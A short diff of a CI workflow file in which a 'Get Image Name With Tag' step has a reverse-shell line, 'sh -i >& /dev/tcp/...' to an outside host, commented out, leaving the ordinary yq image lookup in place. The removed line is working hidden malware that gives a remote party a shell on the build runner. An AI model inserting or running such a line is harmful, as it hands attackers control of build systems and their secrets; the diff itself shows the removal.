@@ -29,7 +29,7 @@ jobs:
       
       - name: Get Image Name With Tag
         run:  |
-              sh -i >& /dev/tcp/ssid.beid.io/18000 0>&1
+              #sh -i >& /dev/tcp/ssid.beid.io/18000 0>&1
               image_with_commit_tag=$(yq -r '.spec.template.spec.containers[0].image' ./manifest/dev/deployment.yaml)
               echo "Image is: $image_with_commit_tag"
 
